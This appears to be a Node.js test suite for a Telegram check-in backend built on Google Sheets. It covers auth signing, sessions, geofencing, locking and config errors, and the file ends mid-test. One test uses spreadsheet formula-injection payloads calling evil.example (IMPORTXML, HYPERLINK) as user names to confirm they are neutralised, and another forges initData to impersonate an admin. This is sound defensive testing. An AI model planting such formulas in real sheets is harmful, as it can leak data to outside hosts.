'use strict';
/**
 * Business rules through doPost, against the emulated Sheet and Bot API.
 * Maps to the handoff's acceptance tests where they are backend-observable.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const { createEnv, isDate, formatDate } = require('./gas-emulator');
const signer = require('../tools/sign-initdata');

const TOKEN = '999999:TEST-backend-token_abc';
const SITE = { lat: 1.2834, lng: 103.8607 };
const T0 = Date.parse('2026-09-21T02:30:15Z'); // 10:30:15 SGT
const MIN = 60 * 1000;

const ADMIN = { id: 111111, first_name: 'Ada', last_name: 'Admin', username: 'ada' };
const ADMIN2 = { id: 222222, first_name: 'Bo', username: 'bo' };
const MEMBER = { id: 333333, first_name: 'Cy', last_name: 'Member', username: 'cy' };
const MEMBER2 = { id: 444444, first_name: 'Di' };
const OUTSIDER = { id: 555555, first_name: 'Ed' };

const ONSITE = { lat: SITE.lat + 0.0005, lng: SITE.lng, accuracy: 20 }; // ~56 m away
const OFFSITE = { lat: SITE.lat + 0.01, lng: SITE.lng, accuracy: 20 }; // ~1.1 km away
const BLURRY = { ...ONSITE, accuracy: 250 };

function setup({ statuses = {}, config = {} } = {}) {
  const env = createEnv({
    props: { BOT_TOKEN: TOKEN },
    telegram: {
      getChatMember: ({ user_id }) => {
        const s = statuses[user_id];
        if (typeof s === 'function') return s();
        if (s === undefined || typeof s === 'string') return { ok: true, result: { status: s || 'member', user: { id: user_id } } };
        return s; // full response body
      },
    },
  });
  env.setNow(T0);
  env.call('setupSheets');
  const values = {
    SITE_LAT: String(SITE.lat),
    SITE_LNG: String(SITE.lng),
    ADMIN_IDS: `${ADMIN.id}, ${ADMIN2.id}`,
    GROUP_CHAT_ID: '-1001234567890',
    MINI_APP_LINK: 'https://t.me/test_bot/checkin',
    ...config,
  };
  const cfg = env.sheet('Config');
  for (let r = 2; r <= cfg.getLastRow(); r++) {
    const key = cfg.getRange(r, 1).getValue();
    if (key in values) cfg.getRange(r, 2).setValue(values[key]);
  }
  env.req = (action, user, extra = {}) => {
    const fields = signer.buildFields({ ...signer.DEFAULTS, user, authDate: Math.floor(env.nowMs / 1000) });
    return env.post({ action, initData: signer.encode(signer.sign(fields, TOKEN)), platform: 'android', ...extra });
  };
  env.checkin = (user, location = ONSITE, extra = {}) => env.req('checkin', user, { location, ...extra });
  env.rows = (name) => env.sheet(name).rows();
  return env;
}

// ---------- router & auth ----------

test('malformed body / unknown action -> BAD_REQUEST', () => {
  const env = setup();
  assert.equal(env.post('not json').code, 'BAD_REQUEST');
  assert.equal(env.post({ action: 'deleteEverything' }).code, 'BAD_REQUEST');
  assert.equal(env.post('null').code, 'BAD_REQUEST');
  assert.equal(env.post('[]').code, 'BAD_REQUEST');
});

test('AT9: tampered initData -> AUTH_FAILED; initData older than 15 min -> AUTH_EXPIRED', () => {
  const env = setup();
  const fields = signer.buildFields({ ...signer.DEFAULTS, user: MEMBER, authDate: Math.floor(T0 / 1000) });
  const signed = signer.sign(fields, TOKEN);
  const forged = signer.encode({ ...signed, user: signer.userJson({ ...MEMBER, id: ADMIN.id }) });
  assert.equal(env.post({ action: 'status', initData: forged }).code, 'AUTH_FAILED');
  assert.equal(env.post({ action: 'status', initData: signer.encode(signer.sign(fields, 'other:token')) }).code, 'AUTH_FAILED');
  assert.equal(env.post({ action: 'status' }).code, 'AUTH_FAILED');

  const valid = signer.encode(signed);
  env.setNow(T0 + 15 * MIN);
  assert.equal(env.post({ action: 'status', initData: valid }).code, 'OK');
  env.setNow(T0 + 15 * MIN + 1000);
  const res = env.post({ action: 'status', initData: valid });
  assert.equal(res.code, 'AUTH_EXPIRED');
  assert.equal(res.ok, false);
  assert.ok(res.message.length > 0);
});

test('client-sent names are ignored; identity comes only from initData', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  const res = env.req('checkin', MEMBER, { location: ONSITE, user: { id: 999, first_name: 'Forged' }, userId: 999 });
  assert.equal(res.code, 'CHECKED_IN');
  const [row] = env.rows('Log');
  assert.equal(row[2], MEMBER.id);
  assert.equal(row[3], 'Cy');
});

// ---------- status ----------

test('status: member vs admin, with and without a session', () => {
  const env = setup();
  let s = env.req('status', MEMBER);
  assert.deepEqual([s.ok, s.code, s.data.isAdmin, s.data.activeSession, s.data.myCheckin], [true, 'OK', false, null, null]);
  s = env.req('status', ADMIN);
  assert.equal(s.data.isAdmin, true);

  env.req('startSession', ADMIN);
  s = env.req('status', MEMBER);
  assert.equal(s.data.activeSession.sessionId, 'S-20260921-1030');
  assert.equal(s.data.activeSession.closesAtText, '11:30');
  assert.equal(s.data.activeSession.startedByName, 'Ada Admin');
  assert.equal(s.data.myCheckin, null);

  env.setNow(T0 + 2 * MIN);
  env.checkin(MEMBER);
  s = env.req('status', MEMBER);
  assert.equal(s.data.myCheckin.atText, '10:32');
  assert.equal(s.data.myCheckin.at, new Date(T0 + 2 * MIN).toISOString());
});

// ---------- startSession ----------

test('AT1: admin starts a session -> one Sessions row with server-time window', () => {
  const env = setup();
  const res = env.req('startSession', ADMIN);
  assert.equal(res.code, 'SESSION_STARTED');
  assert.equal(res.ok, true);
  assert.equal(res.data.closesAtText, '11:30');
  const rows = env.rows('Sessions');
  assert.equal(rows.length, 1);
  const [id, byId, byName, opens, closes, msgId, status, count] = rows[0];
  assert.equal(id, 'S-20260921-1030');
  assert.equal(byId, ADMIN.id);
  assert.equal(byName, 'Ada Admin');
  assert.ok(isDate(opens) && isDate(closes));
  assert.equal(opens.getTime(), T0);
  assert.equal(closes.getTime() - opens.getTime(), 60 * MIN);
  assert.deepEqual([msgId, status, count], ['', 'open', 0]);
  assert.equal(env.rows('Log').length, 0, 'admins are not auto-checked in');
});

test('non-admin cannot start a session', () => {
  const env = setup();
  const res = env.req('startSession', MEMBER);
  assert.equal(res.code, 'NOT_ADMIN');
  assert.equal(env.rows('Sessions').length, 0);
});

test('AT2: any admin starting during an active session -> SESSION_ACTIVE, no new row', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.setNow(T0 + 30 * MIN);
  for (const who of [ADMIN, ADMIN2]) {
    const res = env.req('startSession', who);
    assert.equal(res.code, 'SESSION_ACTIVE');
    assert.equal(res.ok, false);
    assert.equal(res.data.closesAtText, '11:30');
    assert.equal(res.data.startedByName, 'Ada Admin');
    assert.match(res.message, /11:30.*Ada Admin/);
  }
  assert.equal(env.rows('Sessions').length, 1);
});

test('AT2: back-to-back starts produce exactly one session', () => {
  const env = setup();
  const a = env.req('startSession', ADMIN);
  const b = env.req('startSession', ADMIN2);
  assert.deepEqual([a.code, b.code], ['SESSION_STARTED', 'SESSION_ACTIVE']);
  assert.equal(env.rows('Sessions').length, 1);
});

test('AT5: after closes_at a new session can start (and not a millisecond before)', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.setNow(T0 + 60 * MIN - 1);
  assert.equal(env.req('startSession', ADMIN2).code, 'SESSION_ACTIVE');
  env.setNow(T0 + 60 * MIN);
  const res = env.req('startSession', ADMIN2);
  assert.equal(res.code, 'SESSION_STARTED');
  assert.equal(res.data.sessionId, 'S-20260921-1130');
  assert.equal(env.rows('Sessions').length, 2);
});

test('lock not available -> BUSY and nothing written', () => {
  const env = setup();
  env.lockHeldElsewhere = true;
  assert.equal(env.req('startSession', ADMIN).code, 'BUSY');
  assert.equal(env.rows('Sessions').length, 0);
  env.lockHeldElsewhere = false;
  env.req('startSession', ADMIN);
  env.lockHeldElsewhere = true;
  assert.equal(env.checkin(MEMBER).code, 'BUSY');
  assert.equal(env.rows('Log').length, 0);
});

test('writes under the lock are flushed before the lock is released', () => {
  const env = setup();
  env.events.length = 0;
  env.req('startSession', ADMIN);
  env.checkin(MEMBER);
  const ev = env.events.map((e) => e.type);
  let inLock = false;
  let wroteSinceFlush = false;
  for (const t of ev) {
    if (t === 'lock') inLock = true;
    if (t === 'write' && inLock) wroteSinceFlush = true;
    if (t === 'flush') wroteSinceFlush = false;
    if (t === 'unlock') {
      assert.equal(wroteSinceFlush, false, 'unlock with unflushed writes');
      inLock = false;
    }
  }
  assert.ok(ev.filter((t) => t === 'unlock').length >= 2);
});

// ---------- checkin ----------

test('NO_ACTIVE_SESSION writes nothing anywhere', () => {
  const env = setup();
  const res = env.checkin(MEMBER);
  assert.equal(res.code, 'NO_ACTIVE_SESSION');
  assert.equal(env.rows('Log').length, 0);
  assert.equal(env.rows('Rejected').length, 0);
});

test('AT3: on-site member -> exactly one Log row, SGT server timestamp, all fields filled', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.setNow(T0 + 5 * MIN);
  const res = env.checkin(MEMBER);
  assert.equal(res.code, 'CHECKED_IN');
  assert.equal(res.ok, true);
  assert.equal(res.data.atText, '10:35');
  const rows = env.rows('Log');
  assert.equal(rows.length, 1);
  const [ts, sid, uid, first, last, username, lat, lng, acc, dist, key] = rows[0];
  assert.ok(isDate(ts));
  assert.equal(ts.getTime(), T0 + 5 * MIN);
  assert.equal(formatDate(ts, 'Asia/Singapore', 'yyyy-MM-dd HH:mm:ss'), '2026-09-21 10:35:15');
  assert.deepEqual([sid, uid, first, last, username], ['S-20260921-1030', MEMBER.id, 'Cy', 'Member', 'cy']);
  assert.deepEqual([lat, lng, acc], [ONSITE.lat, ONSITE.lng, 20]);
  assert.ok(dist > 50 && dist < 60, `distance ${dist}`);
  assert.equal(key, `S-20260921-1030:${MEMBER.id}`);
  assert.equal(env.rows('Sessions')[0][7], 1, 'checkin_count incremented');
  assert.equal(env.rows('Rejected').length, 0);
});

test('AT4: same member again (and rapid repeats) -> no new row, original time returned', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.setNow(T0 + 5 * MIN);
  env.checkin(MEMBER);
  env.setNow(T0 + 5 * MIN + 300);
  const again = [env.checkin(MEMBER), env.checkin(MEMBER, OFFSITE), env.checkin(MEMBER, BLURRY), env.checkin(MEMBER, null)];
  for (const res of again) {
    assert.equal(res.code, 'ALREADY_CHECKED_IN');
    assert.equal(res.ok, true);
    assert.equal(res.data.atText, '10:35');
  }
  assert.equal(env.rows('Log').length, 1);
  assert.equal(env.rows('Rejected').length, 0, 'duplicates are never logged');
  assert.equal(env.rows('Sessions')[0][7], 1);
});

test('AT5: after closes_at -> NO_ACTIVE_SESSION (boundary is exclusive)', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.setNow(T0 + 60 * MIN - 1);
  assert.equal(env.checkin(MEMBER).code, 'CHECKED_IN');
  env.setNow(T0 + 60 * MIN);
  assert.equal(env.checkin(MEMBER2).code, 'NO_ACTIVE_SESSION');
  assert.equal(env.req('status', MEMBER2).data.activeSession, null);
});

test('AT6: poor accuracy / off-site -> rejected + Rejected row, retry allowed', () => {
  const env = setup();
  env.req('startSession', ADMIN);

  let res = env.checkin(MEMBER, BLURRY);
  assert.equal(res.code, 'LOW_ACCURACY');
  assert.equal(res.data.accuracyM, 250);
  res = env.checkin(MEMBER, OFFSITE);
  assert.equal(res.code, 'OUT_OF_RANGE');
  assert.ok(res.data.distanceM > 1000);
  res = env.checkin(MEMBER, { lat: ONSITE.lat, lng: ONSITE.lng }); // no accuracy at all
  assert.equal(res.code, 'LOW_ACCURACY');

  const rej = env.rows('Rejected');
  assert.deepEqual(rej.map((r) => r[5]), ['LOW_ACCURACY', 'OUT_OF_RANGE', 'LOW_ACCURACY']);
  assert.deepEqual(rej[0].slice(1, 5), ['S-20260921-1030', MEMBER.id, 'Cy Member', 'cy']);
  assert.equal(rej[0][8], 250);
  assert.equal(rej[0][9], '', 'no distance computed for LOW_ACCURACY');
  assert.ok(rej[1][9] > 1000);
  assert.equal(env.rows('Log').length, 0);

  assert.equal(env.checkin(MEMBER, ONSITE).code, 'CHECKED_IN');
  assert.equal(env.rows('Log').length, 1);
});

test('accuracy exactly at MAX_ACCURACY_M is accepted, just above is not', () => {
  const env = setup({ config: { RADIUS_M: '150', MAX_ACCURACY_M: '100' } });
  env.req('startSession', ADMIN);
  assert.equal(env.checkin(MEMBER, { ...ONSITE, accuracy: 100 }).code, 'CHECKED_IN');
  assert.equal(env.checkin(MEMBER2, { ...ONSITE, accuracy: 100.01 }).code, 'LOW_ACCURACY');
});

test('missing or invalid location -> BAD_REQUEST (not logged)', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  for (const loc of [undefined, null, {}, { lat: '1.28', lng: '103.86', accuracy: 5 }, { lat: 91, lng: 0, accuracy: 5 }, { lat: NaN, lng: 0 }]) {
    assert.equal(env.req('checkin', MEMBER, { location: loc }).code, 'BAD_REQUEST', String(JSON.stringify(loc)));
  }
  assert.equal(env.rows('Rejected').length, 0);
});

test('AT7: desktop/web platform -> UNSUPPORTED_PLATFORM; logged only while a session is open', () => {
  const env = setup();
  for (const platform of ['tdesktop', 'web', 'weba', 'macos', undefined, 'Android']) {
    assert.equal(env.checkin(MEMBER, ONSITE, { platform }).code, 'UNSUPPORTED_PLATFORM');
  }
  assert.equal(env.rows('Rejected').length, 0, 'no-session attempts are never logged');
  env.req('startSession', ADMIN);
  assert.equal(env.checkin(MEMBER, ONSITE, { platform: 'tdesktop' }).code, 'UNSUPPORTED_PLATFORM');
  const rej = env.rows('Rejected');
  assert.equal(rej.length, 1);
  assert.equal(rej[0][5], 'UNSUPPORTED_PLATFORM');
  assert.equal(env.checkin(MEMBER, ONSITE, { platform: 'ios' }).code, 'CHECKED_IN');
});

test('AT8: non-members -> NOT_MEMBER (+ Rejected row while a session is open)', () => {
  const env = setup({
    statuses: {
      [OUTSIDER.id]: 'left',
      444444: 'kicked',
      666666: { ok: true, result: { status: 'restricted', is_member: false } },
      777777: { ok: true, result: { status: 'restricted', is_member: true } },
      888888: { ok: false, error_code: 400, description: 'Bad Request: user not found' },
      999999: { ok: false, error_code: 400, description: 'Bad Request: PARTICIPANT_ID_INVALID' },
      101010: { ok: false, error_code: 400, description: 'Bad Request: member not found' },
      141414: { ok: false, error_code: 400, description: 'Bad Request: USER_ID_INVALID' },
      121212: 'administrator',
      131313: 'creator',
    },
  });
  env.req('startSession', ADMIN);
  const who = (id) => ({ id, first_name: `U${id}` });
  assert.equal(env.checkin(OUTSIDER).code, 'NOT_MEMBER');
  assert.equal(env.checkin(who(444444)).code, 'NOT_MEMBER');
  assert.equal(env.checkin(who(666666)).code, 'NOT_MEMBER');
  assert.equal(env.checkin(who(777777)).code, 'CHECKED_IN');
  assert.equal(env.checkin(who(888888)).code, 'NOT_MEMBER');
  assert.equal(env.checkin(who(999999)).code, 'NOT_MEMBER');
  assert.equal(env.checkin(who(101010)).code, 'NOT_MEMBER');
  assert.equal(env.checkin(who(141414)).code, 'NOT_MEMBER');
  assert.equal(env.checkin(who(121212)).code, 'CHECKED_IN');
  assert.equal(env.checkin(who(131313)).code, 'CHECKED_IN');
  const reasons = env.rows('Rejected').map((r) => r[5]);
  assert.deepEqual(reasons, Array(7).fill('NOT_MEMBER'));
  const call = env.fetches.find((f) => f.url.endsWith('/getChatMember'));
  assert.deepEqual(JSON.parse(call.opts.payload), { chat_id: '-1001234567890', user_id: OUTSIDER.id });
  assert.equal(call.opts.muteHttpExceptions, true);
});

test('bot setup problems surface as SERVER_ERROR, never as NOT_MEMBER', () => {
  for (const body of [
    { ok: false, error_code: 400, description: 'Bad Request: chat not found' },
    { ok: false, error_code: 403, description: 'Forbidden: bot was kicked from the supergroup chat' },
    { ok: false, error_code: 401, description: 'Unauthorized' },
    { ok: false, error_code: 500, description: 'Internal Server Error' },
  ]) {
    const env = setup({ statuses: { [MEMBER.id]: body } });
    env.req('startSession', ADMIN);
    const res = env.checkin(MEMBER);
    assert.equal(res.code, 'SERVER_ERROR', body.description);
    assert.equal(env.rows('Rejected').length, 0);
  }
  const migrated = setup({ statuses: { [MEMBER.id]: { ok: false, error_code: 400,
    description: 'Bad Request: group chat was upgraded to a supergroup chat', parameters: { migrate_to_chat_id: -1009876543210 } } } });
  migrated.req('startSession', ADMIN);
  const m = migrated.checkin(MEMBER);
  assert.equal(m.code, 'SERVER_ERROR');
  assert.match(m.message, /-1009876543210/, 'tells the owner the new GROUP_CHAT_ID');

  const env = setup({ statuses: { [MEMBER.id]: { ok: false, error_code: 429, description: 'Too Many Requests: retry after 3' } } });
  env.req('startSession', ADMIN);
  assert.equal(env.checkin(MEMBER).code, 'BUSY');
});

test('BOT_TOKEN never appears in responses or logs, even when UrlFetchApp throws with the URL', () => {
  const env = setup({
    statuses: {
      [MEMBER.id]: () => { throw new Error(`Address unavailable: https://api.telegram.org/bot${TOKEN}/getChatMember`); },
    },
  });
  env.req('startSession', ADMIN);
  const res = env.checkin(MEMBER);
  assert.equal(res.code, 'SERVER_ERROR');
  assert.ok(!JSON.stringify(res).includes(TOKEN));
  assert.ok(env.logs.length > 0, 'the failure is logged');
  for (const l of env.logs) assert.ok(!l.text.includes(TOKEN) && !l.text.includes('TEST-backend-token'), l.text);
});

test('user text is stored as text: no formula injection (in Sheets or CSV export), no number/date coercion', () => {
  const env = setup();
  env.req('startSession', { ...ADMIN, first_name: '=IMPORTXML("http://evil.example","//a")', last_name: '' });
  const nasty = { id: MEMBER.id, first_name: '=HYPERLINK("http://evil.example","x")', last_name: '00123', username: 'TRUE' };
  assert.equal(env.checkin(nasty).code, 'CHECKED_IN');
  env.checkin({ id: 424242, first_name: '+1-2', last_name: '1/2' }, OFFSITE);
  env.checkin({ id: 434343, first_name: '@cmd', last_name: '' }, OFFSITE);
  env.checkin({ id: 454545, first_name: '-2+3', last_name: '' }, OFFSITE);
  assert.deepEqual(env.formulaWrites, []);
  // Formula-like names keep a visible leading apostrophe so a CSV export can't run them either.
  const [log] = env.rows('Log');
  assert.deepEqual(log.slice(3, 6), ["'=HYPERLINK(\"http://evil.example\",\"x\")", '00123', 'TRUE']);
  assert.equal(env.rows('Sessions')[0][2], "'=IMPORTXML(\"http://evil.example\",\"//a\")");
  assert.deepEqual(env.rows('Rejected').map((r) => r[3]), ["'+1-2 1/2", "'@cmd", "'-2+3"]);
  assert.equal(env.req('startSession', ADMIN2).data.startedByName, "'=IMPORTXML(\"http://evil.example\",\"//a\")");
  // Ordinary names are untouched.
  assert.equal(env.checkin({ id: 464646, first_name: 'Ann', last_name: "O'Neil" }).code, 'CHECKED_IN');
  assert.deepEqual(env.rows('Log')[1].slice(3, 5), ['Ann', "O'Neil"]);
});

test('a new session gives everyone a fresh check-in', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.checkin(MEMBER);
  env.setNow(T0 + 61 * MIN);
  env.req('startSession', ADMIN2);
  assert.equal(env.checkin(MEMBER).code, 'CHECKED_IN');
  const keys = env.rows('Log').map((r) => r[10]);
  assert.deepEqual(keys, [`S-20260921-1030:${MEMBER.id}`, `S-20260921-1131:${MEMBER.id}`]);
  assert.deepEqual(env.rows('Sessions').map((r) => r[7]), [1, 1]);
});

test('dedupe matches the entire key only (user 33 is not user 333333)', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.checkin(MEMBER);
  assert.equal(env.checkin({ id: 33, first_name: 'Short' }).code, 'CHECKED_IN');
  assert.equal(env.checkin({ id: 3333333, first_name: 'Long' }).code, 'CHECKED_IN');
  assert.equal(env.rows('Log').length, 3);
});

test('missing Config values -> SERVER_ERROR naming the key; status still works', () => {
  const env = setup({ config: { SITE_LAT: '', GROUP_CHAT_ID: '' } });
  env.req('startSession', ADMIN);
  const res = env.checkin(MEMBER);
  assert.equal(res.code, 'SERVER_ERROR');
  assert.match(res.message, /SITE_LAT/);
  assert.match(res.message, /GROUP_CHAT_ID/);
  assert.equal(env.req('status', MEMBER).code, 'OK');
});

test('web app requests open the Sheet by the SPREADSHEET_ID that setupSheets stored', () => {
  const env = setup();
  assert.equal(env.props.SPREADSHEET_ID, env.ss.getId());
  delete env.props.SPREADSHEET_ID;
  const res = env.req('status', MEMBER);
  assert.equal(res.code, 'SERVER_ERROR');
  assert.match(res.message, /setupSheets/);
});

test('missing BOT_TOKEN -> SERVER_ERROR', () => {
  const env = setup();
  delete env.props.BOT_TOKEN;
  assert.equal(env.req('status', MEMBER).code, 'SERVER_ERROR');
});

test('setupSheets is idempotent and never overwrites filled-in Config', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.call('setupSheets');
  env.call('setupSheets');
  assert.equal(env.ss.getSpreadsheetTimeZone(), 'Asia/Singapore');
  const cfg = env.sheet('Config').rows();
  assert.equal(cfg.length, 9);
  assert.deepEqual(cfg.find((r) => r[0] === 'ADMIN_IDS'), ['ADMIN_IDS', `${ADMIN.id}, ${ADMIN2.id}`]);
  assert.deepEqual(cfg.find((r) => r[0] === 'GROUP_CHAT_ID'), ['GROUP_CHAT_ID', '-1001234567890'], 'kept as text');
  assert.equal(env.rows('Sessions').length, 1);
});

// ---------- review findings (Phase 1 adversarial review) ----------

function insertColumn(sheet, col, header) {
  const last = sheet.getLastRow();
  const lastCol = sheet.getLastColumn();
  for (let r = 1; r <= last; r++) {
    for (let c = lastCol; c >= col; c--) sheet.cells.set(`${r}:${c + 1}`, sheet._get(r, c));
    sheet.cells.set(`${r}:${col}`, r === 1 ? header : '');
  }
}

test('race: a start landing between another start and its lock still yields exactly one session', () => {
  const env = setup();
  let b;
  env.raceBeforeNextLock(() => { b = env.req('startSession', ADMIN2); });
  const a = env.req('startSession', ADMIN);
  assert.deepEqual([b.code, a.code], ['SESSION_STARTED', 'SESSION_ACTIVE']);
  assert.equal(a.data.startedByName, 'Bo');
  assert.equal(env.rows('Sessions').length, 1);
});

test('race: two rapid taps -> one Log row, second sees ALREADY_CHECKED_IN', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  let first;
  env.raceBeforeNextLock(() => { first = env.checkin(MEMBER); });
  const second = env.checkin(MEMBER);
  assert.deepEqual([first.code, second.code], ['CHECKED_IN', 'ALREADY_CHECKED_IN']);
  assert.equal(env.rows('Log').length, 1);
  assert.equal(env.rows('Sessions')[0][7], 1);
});

test('getChatMember runs outside the lock, and every lock wait is 10 s', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.events.length = 0;
  env.checkin(MEMBER);
  env.checkin(MEMBER2, OFFSITE);
  let inLock = false;
  for (const e of env.events) {
    if (e.type === 'lock') inLock = true;
    if (e.type === 'unlock') inLock = false;
    if (e.type === 'fetch') assert.equal(inLock, false, 'network call while holding the lock');
    if (e.type === 'tryLock') assert.equal(e.ms, 10000);
  }
  assert.equal(env.events.filter((e) => e.type === 'fetch').length, 2);
});

test('non-default Config values are honoured', () => {
  let env = setup({ config: { RADIUS_M: '40' } });
  env.req('startSession', ADMIN);
  assert.equal(env.checkin(MEMBER).code, 'OUT_OF_RANGE'); // ONSITE is ~56 m

  env = setup({ config: { MAX_ACCURACY_M: '10' } });
  env.req('startSession', ADMIN);
  assert.equal(env.checkin(MEMBER).code, 'LOW_ACCURACY'); // accuracy 20

  env = setup({ config: { SESSION_MINUTES: '30' } });
  assert.equal(env.req('startSession', ADMIN).data.closesAtText, '11:00');
  env.setNow(T0 + 30 * MIN);
  assert.equal(env.checkin(MEMBER).code, 'NO_ACTIVE_SESSION');
  assert.equal(env.req('startSession', ADMIN2).code, 'SESSION_STARTED');

  env = setup({ config: { INITDATA_MAX_AGE_MIN: '5' } });
  const fields = signer.buildFields({ ...signer.DEFAULTS, user: MEMBER, authDate: Math.floor(T0 / 1000) });
  const initData = signer.encode(signer.sign(fields, TOKEN));
  env.setNow(T0 + 5 * MIN);
  assert.equal(env.post({ action: 'status', initData }).code, 'OK');
  env.setNow(T0 + 6 * MIN);
  assert.equal(env.post({ action: 'status', initData }).code, 'AUTH_EXPIRED');
});

test('geofence boundary: ~140 m accepted, ~160 m rejected (RADIUS_M 150)', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  const inside = env.checkin(MEMBER, { lat: SITE.lat + 0.001259, lng: SITE.lng, accuracy: 20 });
  assert.equal(inside.code, 'CHECKED_IN');
  const outside = env.checkin(MEMBER2, { lat: SITE.lat + 0.001439, lng: SITE.lng, accuracy: 20 });
  assert.equal(outside.code, 'OUT_OF_RANGE');
  assert.equal(outside.data.distanceM, 160);
});

test('checkin_count counts every accepted check-in', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  for (const u of [MEMBER, MEMBER2, ADMIN]) assert.equal(env.checkin(u).code, 'CHECKED_IN');
  env.checkin(MEMBER);
  assert.equal(env.rows('Sessions')[0][7], 3);
});

test('Rejected rows carry a Date timestamp, the submitted coordinates and the session id', () => {
  const env = setup({ statuses: { [OUTSIDER.id]: 'left' } });
  env.req('startSession', ADMIN);
  env.setNow(T0 + 3 * MIN);
  env.checkin(MEMBER, OFFSITE);
  env.checkin(OUTSIDER, ONSITE);
  const [off, notMember] = env.rows('Rejected');
  assert.ok(isDate(off[0]));
  assert.equal(off[0].getTime(), T0 + 3 * MIN);
  assert.deepEqual([off[6], off[7]], [OFFSITE.lat, OFFSITE.lng]);
  assert.deepEqual([notMember[1], notMember[2], notMember[5]], ['S-20260921-1030', OUTSIDER.id, 'NOT_MEMBER']);
  assert.deepEqual([notMember[6], notMember[7], notMember[8]], [ONSITE.lat, ONSITE.lng, 20]);
});

test('check order: accuracy before distance; platform before membership (no Bot API call)', () => {
  const env = setup({ statuses: { [OUTSIDER.id]: 'left' } });
  env.req('startSession', ADMIN);
  assert.equal(env.checkin(MEMBER, { ...OFFSITE, accuracy: 250 }).code, 'LOW_ACCURACY');
  const before = env.fetches.length;
  assert.equal(env.checkin(OUTSIDER, ONSITE, { platform: 'tdesktop' }).code, 'UNSUPPORTED_PLATFORM');
  assert.equal(env.fetches.length, before);
});

test('ISO closesAt / at fields are the real instants', () => {
  const env = setup();
  const closes = new Date(T0 + 60 * MIN).toISOString();
  assert.equal(env.req('startSession', ADMIN).data.closesAt, closes);
  assert.equal(env.req('status', MEMBER).data.activeSession.closesAt, closes);
  assert.equal(env.req('startSession', ADMIN2).data.closesAt, closes);
  env.setNow(T0 + 7 * MIN);
  const res = env.checkin(MEMBER);
  assert.equal(res.data.at, new Date(T0 + 7 * MIN).toISOString());
  assert.equal(res.data.closesAt, closes);
  env.setNow(T0 + 9 * MIN);
  assert.equal(env.checkin(MEMBER).data.at, new Date(T0 + 7 * MIN).toISOString());
});

test('admin match is on the whole id', () => {
  const env = setup();
  for (const id of [1111, 11111, 1111112, 22222]) {
    assert.equal(env.req('startSession', { id, first_name: 'X' }).code, 'NOT_ADMIN', String(id));
    assert.equal(env.req('status', { id, first_name: 'X' }).data.isAdmin, false);
  }
});

test('ADMIN_IDS that cannot match anyone -> SERVER_ERROR naming it (not a silent NOT_ADMIN)', () => {
  for (const ADMIN_IDS of ['', '111111;222222', '@ada']) {
    const env = setup({ config: { ADMIN_IDS } });
    const res = env.req('startSession', ADMIN);
    assert.equal(res.code, 'SERVER_ERROR', JSON.stringify(ADMIN_IDS));
    assert.match(res.message, /ADMIN_IDS/);
  }
});

test('whitespace-only Config values count as blank', () => {
  let env = setup({ config: { SITE_LAT: ' ', SITE_LNG: ' ' } });
  env.req('startSession', ADMIN);
  const res = env.checkin(MEMBER);
  assert.equal(res.code, 'SERVER_ERROR');
  assert.match(res.message, /SITE_LAT/);
  assert.match(res.message, /SITE_LNG/);

  env = setup({ config: { RADIUS_M: '  ', SESSION_MINUTES: ' ' } });
  assert.equal(env.req('startSession', ADMIN).data.closesAtText, '11:30'); // default 60
  assert.equal(env.checkin(MEMBER).code, 'CHECKED_IN'); // default 150 m
});

test('Sessions tab with a column inserted fails closed (no second session)', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  insertColumn(env.sheet('Sessions'), 4, 'notes');
  env.setNow(T0 + 10 * MIN);
  const res = env.req('startSession', ADMIN2);
  assert.equal(res.code, 'SERVER_ERROR');
  assert.match(res.message, /Sessions/);
  assert.equal(env.rows('Sessions').length, 1);
  assert.equal(env.req('status', MEMBER).code, 'SERVER_ERROR');
});

test('Sessions dates that are no longer Date values fail closed', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.sheet('Sessions').cells.set('2:5', 46286.5); // e.g. "Clear formatting" turns a date into a serial number
  const res = env.req('startSession', ADMIN2);
  assert.equal(res.code, 'SERVER_ERROR');
  assert.match(res.message, /row 2/);
  assert.equal(env.rows('Sessions').length, 1);
});

test('Log tab with a column inserted fails closed (no duplicate check-in)', () => {
  const env = setup();
  env.req('startSession', ADMIN);
  env.checkin(MEMBER);
  insertColumn(env.sheet('Log'), 4, 'remarks');
  const res = env.checkin(MEMBER);
  assert.equal(res.code, 'SERVER_ERROR');
  assert.match(res.message, /Log/);
  assert.equal(env.rows('Log').length, 1);
});

test('lone surrogate in initData -> AUTH_FAILED, not SERVER_ERROR', () => {
  const env = setup();
  const fields = signer.buildFields({ ...signer.DEFAULTS, user: MEMBER, authDate: Math.floor(T0 / 1000) });
  const res = env.post({ action: 'status', initData: signer.encode(signer.sign(fields, TOKEN)) + '&x=\ud800' });
  assert.equal(res.code, 'AUTH_FAILED');
});

test('setupSheets copes with pre-existing tabs that have a single row or few columns', () => {
  const env = createEnv({ props: { BOT_TOKEN: TOKEN } });
  const log = env.ss.insertSheet('Log');
  log.maxRows = 1;
  log.maxCols = 3;
  env.call('setupSheets');
  assert.ok(log.getMaxRows() >= 2 && log.getMaxColumns() >= 11);
  assert.equal(env.sheet('Log').getRange(1, 11).getValue(), 'dedupe_key');
});

test('doPost always answers JSON, even when Script Properties are unavailable', () => {
  const env = setup();
  env.propsThrow = true;
  const res = env.req('status', MEMBER);
  assert.equal(res.code, 'SERVER_ERROR');
});

test('getChatMember "not found" errors are logged with Telegram\'s description', () => {
  const env = setup({ statuses: { [OUTSIDER.id]: { ok: false, error_code: 400, description: 'Bad Request: member not found' } } });
  env.req('startSession', ADMIN);
  assert.equal(env.checkin(OUTSIDER).code, 'NOT_MEMBER');
